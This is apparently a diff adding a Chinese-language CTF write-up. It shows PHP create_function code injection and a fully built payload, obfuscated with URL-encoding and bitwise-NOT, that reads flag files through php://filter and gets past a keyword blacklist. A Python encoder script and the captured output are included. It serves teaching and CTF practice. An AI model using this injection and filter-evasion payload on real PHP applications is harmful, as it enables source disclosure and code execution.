@@ -340,21 +340,76 @@ preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|sta
 
 这里利用到了`create_function`匿名函数注入漏洞
 
-> This function internally performs an [eval()](https://www.php.net/manual/zh/function.eval.php) and as such has the same security issues as [eval()](https://www.php.net/manual/zh/function.eval.php). Additionally it has bad performance and memory usage characteristics.   
+> This function internally performs an [eval()](https://www.php.net/manual/zh/function.eval.php) and as such has the same security issues as [eval()](https://www.php.net/manual/zh/function.eval.php). Additionally it has bad performance and memory usage characteristics.  
 
+```php
+<?php
+$arg='return 1;';
+$fun=create_function('',$arg);
+var_dump($fun());#int(1)
+?>
+```
 
+ `$fun`相当于
 
+```
+function fun(){return 1;}
+```
 
+假设将`$arg`替换为以下内容
 
+```php
+<?php
+$arg='};var_dump(123);//';
+$fun=create_function('',$arg);
+var_dump($fun());
+/*
+int(123)
+NULL
+*/
+?>
+```
 
+显然`$fun`相当于`function fun(){};`而后的`var_dump(123)`作为函数外的语句被继续执行,`//`对原本`$fun`后面的`}`进行注释,因此造成了函数的注入漏洞
 
+---
 
+将`$code`覆盖为`create_function`,将`$arg`覆盖为`};var_dump(require(php://filter/convert.base64-encode/resource=flag.php));//`
 
+> 因为`include`被过滤,因此使用`require`代替
 
+但是`php://filter/convert.base64-encode/resource=flag.php`被过滤,可以尝试将其进行取反
 
+因此得到的原始payload为`?file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute
+&shana[]=0&passwd[]=1&flag[code]=create_function&flag[arg]=};var_dump(require(php://filter/convert.base64-encode/resource=flag.php));//`
 
+同时POST传参`file=1&debu=1`
 
+将payload中的关键参数进行urlencode,并将filter进行取反得到最终payload
 
+`?%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=0&%70%61%73%73%77%64[]=1&%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=};%76%61%72%5f%64%75%6d%70(%72%65%71%75%69%72%65(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%99%93%9e%98%d1%8f%97%8f)));//`
+
+得到
+
+```
+PGh0bWw+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNlci1zY2FsYWJsZT1ubyI+DQo8dGl0bGU+RmxhZyBJbiBIZXJlPC90aXRsZT4NCjxpbWcgc3JjPSJtZWFxdWEucG5nIiB3aWR0aD0iNjUwIiBoZWlnaHQ9IjY1MCIgYWx0PSJNZUFxdWHlpKnkuIvnrKzkuIAhIiAvPg0KPCEtLSBUaGUgcGljdHVyZSBpcyBvbmx5IGEgcGljdHVyZS4gLS0+DQo8YnIgLz4NCjwvaGVhZD4NCjwvaHRtbD4NCjw/cGhwDQoJZWNobyAiZmxhZ+WwseWcqOi/memHjO+8jOS9oOiDveaLv+WIsOWug+WQl++8nyI7DQoJJGZmZmZmZmZmMTExMTExMTRnZ2dnZyA9ICJCYWthLCBkbyB5b3UgdGhpbmsgaXQncyBzbyBlYXN5IHRvIGdldCBteSBmbGFnPyBJIGhpZCB0aGUgcmVhbCBmbGFnIGluIHJlYTFmbDRnLnBocCAyMzMzMyI7DQo=int(1)
+```
+
+base64解码得到`flag`在`rea1fl4g.php`,用同样的payload对其进行读取即可
+
+```python
+s = "php://filter/convert.base64-encode/resource=flag.php"
+url = ""
+for i in s:
+    url += "%%%s" % (str(hex(ord(i) ^ 0xff))[2:].zfill(2))
+print(url)
+
+s = "php://filter/convert.base64-encode/resource=rea1fl4g.php"
+url = ""
+for i in s:
+    url += "%%%s" % (str(hex(ord(i) ^ 0xff))[2:].zfill(2))
+print(url)
+```
 
 
 
